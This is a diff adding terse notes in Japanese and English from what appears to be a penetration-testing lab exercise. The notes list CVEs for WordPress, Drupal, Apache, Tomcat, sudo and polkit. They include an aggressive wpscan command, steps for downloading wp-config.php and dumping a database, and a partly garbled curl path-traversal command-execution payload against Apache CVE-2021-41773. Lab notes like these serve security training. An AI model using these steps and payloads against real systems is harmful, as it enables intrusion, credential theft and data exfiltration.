@@ -1,0 +1,31 @@
+1
+wpscan --url  --plugins-detection aggresssive
+wordpress file manager 6.0 cve-2020-25213
+
+metasploit
+
+download wp-config.php
+
+cd /tmp
+shell
+mysqldump -p enshu1_db -u wordpress_user wordpress > wordpress_dump.sql
+
+
+2
+dulpal 7
+cve-2014-3704 失敗
+https://stackoverflow.com/questions/41189714/hashing-passwords-in-node-js-the-same-way-as-in-drupal-7
+
+restful web services
+sudo　cve-2021-3156
+
+3
+cve-2021-41773
+echo -n '/etc/passwd' | base 64
+curl --path-as-is "http://   /cgi-bin/%%32%65 8 /bin/sh" -d 'echo; cat$(echo -n " " | base64 -d)'
+
+
+4
+cve-2017-12617
+
+cve-2021-4034
